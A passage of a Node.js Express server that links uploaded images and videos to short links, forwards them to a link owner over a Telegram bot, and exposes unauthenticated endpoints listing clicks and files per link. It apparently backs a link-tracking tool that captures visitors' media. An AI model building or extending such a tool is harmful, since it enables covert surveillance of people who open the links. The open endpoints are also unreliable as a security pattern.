🔗 *View/Download:* ${BASE_URL}/file/${fileId}
            `;
            
            if (req.file.mimetype.startsWith('image/')) {
                await bot.sendPhoto(link.userId, req.file.buffer, { caption });
            } else {
                await bot.sendVideo(link.userId, req.file.buffer, { caption });
            }
        }
        
        res.json({ 
            success: true, 
            fileId: fileId,
            url: `${BASE_URL}/file/${fileId}`
        });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ========== Serve Files ==========
app.get('/file/:fileId', (req, res) => {
    const { fileId } = req.params;
    
    // Find file in uploads directory
    const files = fs.readdirSync(uploadsDir);
    const filename = files.find(f => f.startsWith(fileId));
    
    if (!filename) {
        return res.status(404).send('File not found');
    }
    
    const filepath = path.join(uploadsDir, filename);
    res.sendFile(filepath);
});

// ========== API Endpoints ==========
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        time: new Date().toISOString(),
        totalLinks: Object.keys(links).length,
        totalClicks: Object.values(clicks).reduce((sum, arr) => sum + arr.length, 0),
        totalFiles: Object.values(userFiles).reduce((sum, arr) => sum + arr.length, 0)
    });
});

app.get('/api/links/:userId', (req, res) => {
    const { userId } = req.params;
    const userLinks = Object.values(links).filter(l => l.userId == userId);
    res.json(userLinks);
});

app.get('/api/stats/:shortId', (req, res) => {
    const { shortId } = req.params;
    const link = Object.values(links).find(l => l.shortId === shortId);
    
    if (!link) {
        return res.status(404).json({ error: 'Link not found' });
    }
    
    const linkClicks = clicks[link.id] || [];
    const files = userFiles[link.id] || [];
    
    res.json({
        link: link,
        totalClicks: linkClicks.length,
        totalFiles: files.length,
        clicks: linkClicks,
        files: files
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on ${BASE_URL}`);
    console.log(`📊 Total links: ${Object.keys(links).length}`);
    console.log(`👁️ Total clicks: ${Object.values(clicks).reduce((sum, arr) => sum + arr.length, 0)}`);
    console.log(`📸 Total files: ${Object.values(userFiles).reduce((sum, arr) => sum + arr.length, 0)}`);
});

export default app;
